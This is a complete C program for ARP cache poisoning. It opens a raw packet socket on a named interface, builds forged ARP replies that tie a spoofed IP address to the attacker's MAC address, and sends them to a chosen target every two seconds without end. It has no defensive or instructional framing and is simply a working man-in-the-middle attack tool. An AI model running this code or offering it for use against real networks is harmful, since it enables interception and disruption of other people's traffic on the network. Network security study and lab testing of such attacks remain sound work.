#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <sys/ioctl.h>

#define MAC_LEN 6

unsigned char attacker_mac[MAC_LEN];
unsigned char target_mac[MAC_LEN];
unsigned char spoof_ip[4];
unsigned char target_ip[4];

// Convert colon-separated MAC string to bytes
int parse_mac(const char *mac_str, unsigned char *mac_bytes) {
    return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
        &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6;
}

// Fetch attacker's MAC
void get_attacker_mac(const char *iface, unsigned char *mac) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, iface);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, MAC_LEN);
}

// Convert IP string to bytes
void str_to_ip(const char *ip_str, unsigned char *ip_bytes) {
    inet_pton(AF_INET, ip_str, ip_bytes);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <interface> <target_ip> <spoof_ip> <target_mac>\n", argv[0]);
        exit(1);
    }

    const char *iface = argv[1];
    const char *target_ip_str = argv[2];
    const char *spoof_ip_str = argv[3];
    const char *target_mac_str = argv[4];

    if (!parse_mac(target_mac_str, target_mac)) {
        fprintf(stderr, "Invalid MAC address format\n");
        exit(1);
    }

    str_to_ip(spoof_ip_str, spoof_ip);
    str_to_ip(target_ip_str, target_ip);
    get_attacker_mac(iface, attacker_mac);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket");
        exit(1);
    }

    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &if_idx);
    int ifindex = if_idx.ifr_ifindex;

    unsigned char packet[42];
    struct ether_header *eth = (struct ether_header *) packet;
    memcpy(eth->ether_shost, attacker_mac, MAC_LEN);
    memcpy(eth->ether_dhost, target_mac, MAC_LEN);
    eth->ether_type = htons(ETH_P_ARP);

    struct ether_arp *arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = MAC_LEN;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);

    memcpy(arp->arp_sha, attacker_mac, MAC_LEN);
    memcpy(arp->arp_spa, spoof_ip, 4);
    memcpy(arp->arp_tha, target_mac, MAC_LEN);
    memcpy(arp->arp_tpa, target_ip, 4);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = ifindex;
    sa.sll_halen = MAC_LEN;
    memcpy(sa.sll_addr, target_mac, MAC_LEN);

    printf("[*] Spoofing %s as %s on interface %s\n", target_ip_str, spoof_ip_str, iface);

    while (1) {
        if (sendto(sock, packet, 42, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            perror("sendto");
        }
        usleep(2000000); // 2 sec interval
    }

    close(sock);
    return 0;
}
